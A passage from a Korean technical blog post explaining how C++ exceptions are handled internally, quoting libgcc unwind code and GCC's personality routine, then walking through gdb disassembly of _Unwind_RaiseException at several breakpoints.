<span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Don&#x27;t let us unwind past the handler context.  */</span></span><br><span class="line">        <span class="built_in">gcc_assert</span>(!match_handler);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">uw_update_context</span>(context, &amp;fs);</span><br><span class="line">        _Unwind_Frames_Increment(context, frames);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *frames_p = frames;</span><br><span class="line">    <span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_Unwind_Resume</code> 함수는 catch 블록이 아닌, 자원 해제 등을 수행하는 cleanup 코드에서 필요한 작업을 마치고 스택을 계속 되감기 위해 호출하는 함수입니다. 앞서 <code>eh1</code> 바이너리의 <code>func</code> 함수 그래프를 캡쳐한 그림을 보면 랜딩 패드의 마지막 부분에서 <code>_Unwind_Resume</code> 함수를 호출하는 것을 확인할 수 있습니다. 이 함수를 호출하는 시점에서는 이미 search 단계를 수행하여 호출 스택 상에서 catch 블록의 존재가 확인된 상태입니다. 따라서 곧바로 <code>_Unwind_RaiseException_Phase2</code> 함수를 호출해 cleanup 단계를 진행하면서 다음 랜딩 패드으로 실행 흐름을 옮깁니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Resume propagation of an existing exception.  This is used after</span></span><br><span class="line"><span class="comment">   e.g. executing cleanup code, and not to implement rethrowing.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> LIBGCC2_UNWIND_ATTRIBUTE</span><br><span class="line">_Unwind_Resume(<span class="keyword">struct</span> _Unwind_Exception *exc) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_Unwind_Context</span> this_context, cur_context;</span><br><span class="line">    _Unwind_Reason_Code code;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> frames;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">uw_init_context</span>(&amp;this_context);</span><br><span class="line">    cur_context = this_context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Choose between continuing to process _Unwind_RaiseException</span></span><br><span class="line"><span class="comment">       or _Unwind_ForcedUnwind.  */</span></span><br><span class="line">    <span class="keyword">if</span> (exc-&gt;private_1 == <span class="number">0</span>)</span><br><span class="line">        code = _Unwind_RaiseException_Phase2(exc, &amp;cur_context, &amp;frames);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        code = _Unwind_ForcedUnwind_Phase2(exc, &amp;cur_context, &amp;frames);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">gcc_assert</span>(code == _URC_INSTALL_CONTEXT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">uw_install_context</span>(&amp;this_context, &amp;cur_context, frames);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Unwind 라이브러리 내부에서 예외를 일으키고 스택을 되감는 전반적인 로직을 그림으로 나타내면 다음과 같습니다.</p>
<p><img src="/images/cpp-exception-handling/8.png" alt="8.png"></p>
<h3 id="c%2B%2B-abi" tabindex="-1">C++ ABI</h3>
<p>C++ ABI는 C++ 코드에서 발생한 예외와 unwind 라이브러리 사이를 연결하는 다리 역할을 합니다. C++ ABI에서 사용하는 중요한 구조체로는 <code>__cxa_exception</code> 과 <code>__cxa_eh_globals</code> 가 있습니다.</p>
<p><code>__cxa_exception</code> 은 C++ 예외를 나타내는 구조체입니다. Unwind 라이브러리에서 사용하는 예외 구조체인 <code>_Unwind_Exception</code> 을 포함하면서 추가적인 정보를 갖추고 있습니다. <code>exceptionType</code> 필드는 throw 구문에서 전달한 인자의 타입을 나타냅니다. <code>nextException</code> 필드는 C++ 예외 구조체들의 스택을 만들기 위해 사용하는데, 후술합니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A primary C++ exception object consists of a header, which is a wrapper</span></span><br><span class="line"><span class="comment">// around an unwind object header with additional C++ specific information,</span></span><br><span class="line"><span class="comment">// followed by the exception object itself.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__cxa_exception</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Manage the exception object itself.</span></span><br><span class="line">  std::type_info *exceptionType;</span><br><span class="line">  <span class="built_in">void</span> (_GLIBCXX_CDTOR_CALLABI *exceptionDestructor)(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The C++ standard has entertaining rules wrt calling set_terminate</span></span><br><span class="line">  <span class="comment">// and set_unexpected in the middle of the exception cleanup process.</span></span><br><span class="line">  std::terminate_handler unexpectedHandler;</span><br><span class="line">  std::terminate_handler terminateHandler;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The caught exception stack threads through here.</span></span><br><span class="line">  __cxa_exception *nextException;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// How many nested handlers have caught this exception.  A negated</span></span><br><span class="line">  <span class="comment">// value is a signal that this object has been rethrown.</span></span><br><span class="line">  <span class="type">int</span> handlerCount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ARM_EABI_UNWINDER__</span></span><br><span class="line">  <span class="comment">// Stack of exceptions in cleanups.</span></span><br><span class="line">  __cxa_exception* nextPropagatingException;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The number of active cleanup handlers for this exception.</span></span><br><span class="line">  <span class="type">int</span> propagationCount;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">// Cache parsed handler data from the personality routine Phase 1</span></span><br><span class="line">  <span class="comment">// for Phase 2 and __cxa_call_unexpected.</span></span><br><span class="line">  <span class="type">int</span> handlerSwitchValue;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *actionRecord;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *languageSpecificData;</span><br><span class="line">  _Unwind_Ptr catchTemp;</span><br><span class="line">  <span class="type">void</span> *adjustedPtr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// The generic exception header.  Must be last.</span></span><br><span class="line">  _Unwind_Exception unwindHeader;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>__cxa_eh_globals</code> 는 스레드마다 하나씩 존재하는 C++ 예외 구조체들의 스택입니다. <code>caughtExceptions</code> 필드는 예외 발생 후 처리가 끝난 예외 구조체들의 연결 리스트입니다. <code>uncaughtExceptions</code> 필드는 발생했지만 아직 처리되지 않은 예외들의 개수를 나타냅니다. 현재 스레드의 <code>__cxa_eh_globals</code> 구조체는 <code>__cxa_get_globals</code> 또는 <code>__cxa_get_globals_fast</code> 함수를 통해서 접근할 수 있습니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Each thread in a C++ program has access to a __cxa_eh_globals object.</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__cxa_eh_globals</span></span><br><span class="line">&#123;</span><br><span class="line">  __cxa_exception *caughtExceptions;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> uncaughtExceptions;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ARM_EABI_UNWINDER__</span></span><br><span class="line">  __cxa_exception* propagatingExceptions;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>C++ ABI에서 throw 구문으로 발생한 예외를 처리하는 과정은 대략 다음과 같습니다.</p>
<ol>
<li><code>__cxa_allocate_exception</code> 함수를 호출하여 <code>__cxa_exception</code> 구조체를 동적 할당합니다.</li>
<li><code>__cxa_throw</code> 함수를 호출하면서 할당한 예외 구조체를 인자로 전달합니다. <code>__cxa_throw</code> 함수는 반환하지 않으며, 내부적으로 unwind 라이브러리의 <code>_Unwind_RaiseException</code> 함수를 호출합니다.</li>
<li><code>_Unwind_RaiseException</code> 함수 내부에서 personality 루틴을 호출합니다. Personality 루틴은 LSDA를 해석하여 랜딩 패드의 주소를 구합니다.</li>
<li>랜딩 패드로 점프합니다. 랜딩 패드가 catch 블록인 경우 <code>__cxa_begin_catch</code> 함수를 호출하여 예외 구조체를 스택의 꼭대기에 푸시합니다.</li>
<li>catch 블록의 끝나면 <code>__cxa_end_catch</code> 함수를 호출하여 스택에서 예외 구조체를 팝하고 소멸시킵니다.</li>
</ol>
<p>대부분의 함수가 위에 작성한 내용과 같이 직관적이고 구현이 단순합니다. 따라서 이 문단에서는 personality 루틴의 구현을 중점적으로 살펴보겠습니다.</p>
<p>GCC의 C++ ABI 구현체에서 personality 루틴의 이름은 <code>__gxx_personality_v0</code> 입니다. (LLVM도 동일한 이름을 사용하지만 구현체가 다릅니다) 이 함수는 소스 코드가 복잡하고 ARM 아키텍처를 위한 코드도 중간중간 섞여 있습니다. 이해를 돕기 위해 아래 코드는 원본 코드에서 필요하지 않은 부분은 제외하였습니다.</p>
<p>25행에서 LSDA의 주소를 얻습니다. 44행은 반복문을 사용해 LSDA의 call-site 테이블을 순회하면서 예외가 발생한 코드 주소에 해당하는 레코드를 찾아 랜딩 패드의 주소를 계산하고, 액션 테이블에서의 해당하는 레코드의 오프셋 <code>action_record</code> 를 얻습니다. 77행에서 <code>action_record</code> 가 0이면 랜딩 패드는 cleanup 코드로, <code>found_type</code> 에 <code>found_cleanup</code> 을 대입합니다. 이외의 경우 catch 블록에 해당하며, 94행부터 LSDA의 action 테이블을 순회합니다. 발생한 예외의 타입에 대응하는 catch 블록이 존재하는지 확인하고 catch 블록을 찾은 경우 <code>found_type</code> 에 <code>found_handler</code> 를 대입합니다.</p>
<p>Personality 루틴은 스택 되감기의 search 단계와 cleanup 단계 중 어느 시점에서 호출되었는지에 따라 동작이 다릅니다. 어느 시점에서 호출되었는지는 두 번째 인자 <code>actions</code> 의 값이 <code>_UA_SEARCH_PHASE</code> 와 <code>_UA_CLEANUP_PHASE</code> 중 무엇인지로 구분합니다. 145행에서 현재 search 단계인 경우 발견한 랜딩 패드가 cleanup 코드면 <code>_URC_CONTINUE_UNWIND</code>, catch 블록이면 <code>_URC_HANDLER_FOUND</code> 를 반환합니다. 반대로 cleanup 단계인 경우 180행에서 <code>_Unwind_SetIP</code> 내장 함수를 호출하여 <code>context-&gt;ra</code> 필드에 랜딩 패드의 주소를 대입하고 <code>_URC_INSTALL_CONTEXT</code> 를 반환합니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CONTINUE_UNWINDING                                     \</span></span><br><span class="line"><span class="meta">    do &#123;                                                       \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (__gnu_unwind_frame(ue_header, context) != _URC_OK) \</span></span><br><span class="line"><span class="meta">            return _URC_FAILURE;                               \</span></span><br><span class="line"><span class="meta">        return _URC_CONTINUE_UNWIND;                           \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PERSONALITY_FUNCTION __gxx_personality_v0</span></span><br><span class="line"></span><br><span class="line"><span class="function">_Unwind_Reason_Code <span class="title">PERSONALITY_FUNCTION</span><span class="params">(<span class="type">int</span> version,</span></span></span><br><span class="line"><span class="params"><span class="function">                         _Unwind_Action actions,</span></span></span><br><span class="line"><span class="params"><span class="function">                         _Unwind_Exception_Class exception_class,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">struct</span> _Unwind_Exception *ue_header,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">struct</span> _Unwind_Context *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Shortcut for phase 2 found handler for domestic exception.</span></span><br><span class="line">    <span class="keyword">if</span> (actions == (_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME) &amp;&amp; !foreign_exception) &#123;</span><br><span class="line">        <span class="built_in">restore_caught_exception</span>(ue_header, handler_switch_value,</span><br><span class="line">                                 language_specific_data, landing_pad);</span><br><span class="line">        found_type = (landing_pad == <span class="number">0</span> ? found_terminate : found_handler);</span><br><span class="line">        <span class="keyword">goto</span> install_context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    language_specific_data = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)</span><br><span class="line">        _Unwind_GetLanguageSpecificData(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If no LSDA, then there are no handlers or cleanups.</span></span><br><span class="line">    <span class="keyword">if</span> (!language_specific_data)</span><br><span class="line">        CONTINUE_UNWINDING;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Parse the LSDA header.</span></span><br><span class="line">    p = <span class="built_in">parse_lsda_header</span>(context, language_specific_data, &amp;info);</span><br><span class="line">    info.ttype_base = <span class="built_in">base_of_encoded_value</span>(info.ttype_encoding, context);</span><br><span class="line">    ip = _Unwind_GetIP(context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ip_before_insn)</span><br><span class="line">        --ip;</span><br><span class="line">    landing_pad = <span class="number">0</span>;</span><br><span class="line">    action_record = <span class="number">0</span>;</span><br><span class="line">    handler_switch_value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Search the call-site table for the action associated with this IP.</span></span><br><span class="line">    <span class="keyword">while</span> (p &lt; info.action_table) &#123;</span><br><span class="line">        _Unwind_Ptr cs_start, cs_len, cs_lp;</span><br><span class="line">        <span class="type">_uleb128_t</span> cs_action;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Note that all call-site encodings are &quot;absolute&quot; displacements.</span></span><br><span class="line">        p = <span class="built_in">read_encoded_value</span>(<span class="number">0</span>, info.call_site_encoding, p, &amp;cs_start);</span><br><span class="line">        p = <span class="built_in">read_encoded_value</span>(<span class="number">0</span>, info.call_site_encoding, p, &amp;cs_len);</span><br><span class="line">        p = <span class="built_in">read_encoded_value</span>(<span class="number">0</span>, info.call_site_encoding, p, &amp;cs_lp);</span><br><span class="line">        p = <span class="built_in">read_uleb128</span>(p, &amp;cs_action);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The table is sorted, so if we&#x27;ve passed the ip, stop.</span></span><br><span class="line">        <span class="keyword">if</span> (ip &lt; info.Start + cs_start)</span><br><span class="line">            p = info.action_table;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ip &lt; info.Start + cs_start + cs_len) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cs_lp)</span><br><span class="line">                landing_pad = info.LPStart + cs_lp;</span><br><span class="line">            <span class="keyword">if</span> (cs_action)</span><br><span class="line">                action_record = info.action_table + cs_action - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> found_something;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If ip is not present in the table, call terminate.  This is for</span></span><br><span class="line">    <span class="comment">// a destructor inside a cleanup, or a library routine the compiler</span></span><br><span class="line">    <span class="comment">// was not expecting to throw.</span></span><br><span class="line">    found_type = found_terminate;</span><br><span class="line">    <span class="keyword">goto</span> do_something;</span><br><span class="line"></span><br><span class="line">found_something:</span><br><span class="line">    <span class="keyword">if</span> (landing_pad == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// If ip is present, and has a null landing pad, there are</span></span><br><span class="line">        <span class="comment">// no cleanups or handlers to be run.</span></span><br><span class="line">        found_type = found_nothing;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (action_record == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// If ip is present, has a non-null landing pad, and a null</span></span><br><span class="line">        <span class="comment">// action table offset, then there are only cleanups present.</span></span><br><span class="line">        <span class="comment">// Cleanups use a zero switch value, as set above.</span></span><br><span class="line">        found_type = found_cleanup;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Otherwise we have a catch handler or exception specification.</span></span><br><span class="line"></span><br><span class="line">        <span class="type">_sleb128_t</span> ar_filter, ar_disp;</span><br><span class="line">        <span class="type">const</span> std::type_info *catch_type;</span><br><span class="line">        _throw_typet *throw_type;</span><br><span class="line">        <span class="type">bool</span> saw_cleanup = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">bool</span> saw_handler = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        thrown_ptr = __get_object_from_ue(ue_header);</span><br><span class="line">        throw_type = __get_exception_header_from_obj(thrown_ptr)-&gt;exceptionType;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            p = action_record;</span><br><span class="line">            p = <span class="built_in">read_sleb128</span>(p, &amp;ar_filter);</span><br><span class="line">            <span class="built_in">read_sleb128</span>(p, &amp;ar_disp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ar_filter == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// Zero filter values are cleanups.</span></span><br><span class="line">                saw_cleanup = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ar_filter &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// Positive filter values are handlers.</span></span><br><span class="line">                catch_type = <span class="built_in">get_ttype_entry</span>(&amp;info, ar_filter);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Null catch type is a catch-all handler; we can catch foreign</span></span><br><span class="line">                <span class="comment">// exceptions with this.  Otherwise we must match types.</span></span><br><span class="line">                <span class="keyword">if</span> (!catch_type || (throw_type &amp;&amp; <span class="built_in">get_adjusted_ptr</span>(catch_type, throw_type,</span><br><span class="line">                                                                   &amp;thrown_ptr))) &#123;</span><br><span class="line">                    saw_handler = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Negative filter values are exception specifications.</span></span><br><span class="line">                <span class="comment">// ??? How do foreign exceptions fit in?  As far as I can</span></span><br><span class="line">                <span class="comment">// see we can&#x27;t match because there&#x27;s no __cxa_exception</span></span><br><span class="line">                <span class="comment">// object to stuff bits in for __cxa_call_unexpected to use.</span></span><br><span class="line">                <span class="comment">// Allow them iff the exception spec is non-empty.  I.e.</span></span><br><span class="line">                <span class="comment">// a throw() specification results in __unexpected.</span></span><br><span class="line">                <span class="keyword">if</span> ((throw_type &amp;&amp; !(actions &amp; _UA_FORCE_UNWIND) &amp;&amp; !foreign_exception)</span><br><span class="line">                        ? !<span class="built_in">check_exception_spec</span>(&amp;info, throw_type, thrown_ptr,</span><br><span class="line">                                                ar_filter)</span><br><span class="line">                        : <span class="built_in">empty_exception_spec</span>(&amp;info, ar_filter)) &#123;</span><br><span class="line">                    saw_handler = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ar_disp == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            action_record = p + ar_disp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (saw_handler) &#123;</span><br><span class="line">            handler_switch_value = ar_filter;</span><br><span class="line">            found_type = found_handler;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            found_type = (saw_cleanup ? found_cleanup : found_nothing);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">do_something:</span><br><span class="line">    <span class="keyword">if</span> (found_type == found_nothing)</span><br><span class="line">        CONTINUE_UNWINDING;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (actions &amp; _UA_SEARCH_PHASE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (found_type == found_cleanup)</span><br><span class="line">            CONTINUE_UNWINDING;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For domestic exceptions, we cache data from phase 1 for phase 2.</span></span><br><span class="line">        <span class="keyword">if</span> (!foreign_exception) &#123;</span><br><span class="line">            <span class="built_in">save_caught_exception</span>(ue_header, context, thrown_ptr,</span><br><span class="line">                                  handler_switch_value, language_specific_data,</span><br><span class="line">                                  landing_pad, action_record);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _URC_HANDLER_FOUND;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">install_context:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (found_type == found_terminate)</span><br><span class="line">            __cxa_call_terminate(ue_header);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cache the TType base value for __cxa_call_unexpected, as we won&#x27;t</span></span><br><span class="line">        <span class="comment">// have an _Unwind_Context then.</span></span><br><span class="line">        <span class="keyword">if</span> (handler_switch_value &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">parse_lsda_header</span>(context, language_specific_data, &amp;info);</span><br><span class="line">            info.ttype_base = <span class="built_in">base_of_encoded_value</span>(info.ttype_encoding,</span><br><span class="line">                                                    context);</span><br><span class="line">            xh-&gt;catchTemp = <span class="built_in">base_of_encoded_value</span>(info.ttype_encoding, context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* For targets with pointers smaller than the word size, we must extend the</span></span><br><span class="line"><span class="comment">       pointer, and this extension is target dependent.  */</span></span><br><span class="line">    _Unwind_SetGR(context, __builtin_eh_return_data_regno(<span class="number">0</span>),</span><br><span class="line">                  __builtin_extend_pointer(ue_header));</span><br><span class="line">    _Unwind_SetGR(context, __builtin_eh_return_data_regno(<span class="number">1</span>),</span><br><span class="line">                  handler_switch_value);</span><br><span class="line">    _Unwind_SetIP(context, landing_pad);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _URC_INSTALL_CONTEXT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Personality 루틴의 반환값은 unwind 라이브러리의 <code>_Unwind_RaiseException</code> 함수의 동작과 큰 연관이 있습니다. <code>_Unwind_RaiseException</code> 함수는 search 단계에서 personality 루틴이 <code>_URC_HANDLER_FOUND</code> 를 반환할 때까지 스택을 되감으면서 <code>_Unwind_Context</code> 구조체의 내용을 갱신합니다. <code>_URC_HANDLER_FOUND</code> 의 반환은 예외를 처리할 catch 블록을 발견했다는 신호이자 search 단계의 성공을 나타냅니다. 이어지는 cleanup 단계에서는 <code>_URC_INSTALL_CONTEXT</code> 의 반환을 신호로 하여 랜딩 패드로 실행 흐름을 옮깁니다. 랜딩 패드가 catch 블록이면 예외 처리가 끝나며, cleanup 코드면 <code>_Unwind_Resume</code> 함수를 호출하여 다음 랜딩 패드로 진행하는 스택 되감기를 시작합니다.</p>
<p>예외가 발생했을 때 C++ ABI와 unwind 라이브러리를 거쳐 처리하는 전체 로직은 다음과 같습니다. 보라색 블록은 프로그램 코드의 일부로 예외가 발생하는 부분과 랜딩 패드, 검은색 블록은 C++ ABI, 회색 블록은 unwind 라이브러리를 나타냅니다.</p>
<p><img src="/images/cpp-exception-handling/9.png" alt="9.png"></p>
<h2 id="%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D" tabindex="-1">라이브러리 동적 분석</h2>
<p><code>eh1</code> 바이너리를 동적 분석하면서 예외 처리의 핵심 부분인 <code>_Unwind_RaiseException</code> 함수 및 personality 루틴의 동작을 직접 살펴보겠습니다. <code>_Unwind_RaiseException</code> 함수 내부에서 다음과 같은 5개 위치에 중단점을 설정합니다.</p>
<ol>
<li>search 단계 반복문 내에서 <code>uw_frame_state_for</code> 함수를 호출하는 부분</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">   <span class="number">0x00007f251026f080</span> &lt;+<span class="number">304</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rsi</span>,<span class="built_in">r13</span></span><br><span class="line">   <span class="number">0x00007f251026f083</span> &lt;+<span class="number">307</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdi</span>,<span class="built_in">r12</span></span><br><span class="line">=&gt; <span class="number">0x00007f251026f086</span> &lt;+<span class="number">310</span>&gt;:   <span class="keyword">call</span>   <span class="number">0x7f251026d800</span></span><br><span class="line">   <span class="number">0x00007f251026f08b</span> &lt;+<span class="number">315</span>&gt;:   <span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x00007f251026f08e</span> &lt;+<span class="number">318</span>&gt;:   <span class="keyword">je</span>     <span class="number">0x7f251026f103</span> &lt;_Unwind_RaiseException+<span class="number">435</span>&gt;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>search 단계 반복문 내에서 <code>fs.personality</code> 필드가 존재하는지 확인하는 부분</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">   <span class="number">0x00007f4fc4d81092</span> &lt;+<span class="number">322</span>&gt;:   <span class="keyword">jne</span>    <span class="number">0x7f4fc4d81160</span> &lt;_Unwind_RaiseException+<span class="number">528</span>&gt;</span><br><span class="line">   <span class="number">0x00007f4fc4d81098</span> &lt;+<span class="number">328</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x70</span>]</span><br><span class="line">=&gt; <span class="number">0x00007f4fc4d8109c</span> &lt;+<span class="number">332</span>&gt;:   <span class="keyword">test</span>   <span class="built_in">rax</span>,<span class="built_in">rax</span></span><br><span class="line">   <span class="number">0x00007f4fc4d8109f</span> &lt;+<span class="number">335</span>&gt;:   <span class="keyword">je</span>     <span class="number">0x7f4fc4d810c8</span> &lt;_Unwind_RaiseException+<span class="number">376</span>&gt;</span><br><span class="line">   <span class="number">0x00007f4fc4d810a1</span> &lt;+<span class="number">337</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">r14</span>]</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>search 단계 반복문 내에서 personality 루틴을 호출하는 부분</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">   <span class="number">0x00007f4fc4d810aa</span> &lt;+<span class="number">346</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00007f4fc4d810af</span> &lt;+<span class="number">351</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="number">0x1</span></span><br><span class="line">=&gt; <span class="number">0x00007f4fc4d810b4</span> &lt;+<span class="number">356</span>&gt;:   <span class="keyword">call</span>   <span class="built_in">rax</span></span><br><span class="line">   <span class="number">0x00007f4fc4d810b6</span> &lt;+<span class="number">358</span>&gt;:   <span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x00007f4fc4d810b9</span> &lt;+<span class="number">361</span>&gt;:   <span class="keyword">je</span>     <span class="number">0x7f4fc4d81170</span> &lt;_Unwind_RaiseException+<span class="number">544</span>&gt;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li><code>_Unwind_RaiseException_Phase2</code> 함수를 호출하는 부분</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">   <span class="number">0x00007f4fc4d8126e</span> &lt;+<span class="number">798</span>&gt;:   <span class="keyword">movups</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1e0</span>],<span class="built_in">xmm0</span></span><br><span class="line">   <span class="number">0x00007f4fc4d81275</span> &lt;+<span class="number">805</span>&gt;:   <span class="keyword">movups</span> XMMWORD <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x1d0</span>],<span class="built_in">xmm1</span></span><br><span class="line">=&gt; <span class="number">0x00007f4fc4d8127c</span> &lt;+<span class="number">812</span>&gt;:   <span class="keyword">call</span>   <span class="number">0x7f4fc4d80b50</span></span><br><span class="line">   <span class="number">0x00007f4fc4d81281</span> &lt;+<span class="number">817</span>&gt;:   <span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x7</span></span><br><span class="line">   <span class="number">0x00007f4fc4d81284</span> &lt;+<span class="number">820</span>&gt;:   <span class="keyword">jne</span>    <span class="number">0x7f4fc4d81103</span> &lt;_Unwind_RaiseException+<span class="number">435</span>&gt;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li><code>uw_install_context</code> 매크로 내에서 랜딩 패드로 점프하는 부분</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">   <span class="number">0x00007f4fc4d812d5</span> &lt;+<span class="number">901</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rsp</span>,<span class="built_in">rcx</span></span><br><span class="line">   <span class="number">0x00007f4fc4d812d8</span> &lt;+<span class="number">904</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">rcx</span></span><br><span class="line">=&gt; <span class="number">0x00007f4fc4d812d9</span> &lt;+<span class="number">905</span>&gt;:   <span class="keyword">jmp</span>    <span class="built_in">rcx</span></span><br></pre></td></tr></table></figure>
